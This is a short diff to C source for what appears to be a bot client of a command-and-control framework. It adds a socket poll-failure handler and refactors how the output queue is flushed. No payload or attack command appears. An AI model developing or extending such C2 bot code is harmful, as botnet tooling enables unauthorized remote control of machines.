@@ -33,6 +33,14 @@ struct sLaika_peerPacketInfo laikaB_pktTbl[LAIKAPKT_MAXNONE] = {
     true),
 };
 
+/* socket event */
+void laikaB_onPollFail(struct sLaika_socket *sock, void *uData) {
+    struct sLaika_peer *peer = (struct sLaika_peer*)sock;
+    struct sLaika_bot *bot = (struct sLaika_bot*)uData;
+
+    laikaS_kill(&bot->peer->sock);
+}
+
 /* ==================================================[[ Bot ]]=================================================== */
 
 struct sLaika_bot *laikaB_newBot(void) {
@@ -47,8 +55,8 @@ struct sLaika_bot *laikaB_newBot(void) {
     bot->peer = laikaS_newPeer(
         laikaB_pktTbl,
         &bot->pList,
-        NULL,
-        NULL,
+        laikaB_onPollFail,
+        (void*)bot,
         (void*)bot
     );
 
@@ -128,31 +136,20 @@ void laikaB_connectToCNC(struct sLaika_bot *bot, char *ip, char *port) {
         LAIKA_ERROR("failed to gen session key!\n");
 }
 
-void laikaB_flushQueue(struct sLaika_bot *bot) {
-    /* flush pList's outQueue */
-    if (bot->pList.outCount > 0) {
-        if (!laikaS_handlePeerOut(&bot->peer->sock))
-            laikaS_kill(&bot->peer->sock);
-
-        laikaP_resetOutQueue(&bot->pList);
-    }
-}
-
 bool laikaB_poll(struct sLaika_bot *bot, int timeout) {
     struct sLaika_pollEvent *evnt;
     int numEvents;
 
     /* flush any events prior (eg. made by a task) */
-    laikaB_flushQueue(bot);
+    laikaP_flushOutQueue(&bot->pList);
     evnt = laikaP_poll(&bot->pList, timeout, &numEvents);
 
     if (numEvents == 0) /* no events? timeout was reached */
         return false;
 
-    if (!laikaP_handleEvent(evnt))
-        laikaS_kill(&bot->peer->sock);
+    laikaP_handleEvent(evnt);
 
     /* flush any events after (eg. made by a packet handler) */
-    laikaB_flushQueue(bot);
+    laikaP_flushOutQueue(&bot->pList);
     return true;
 }
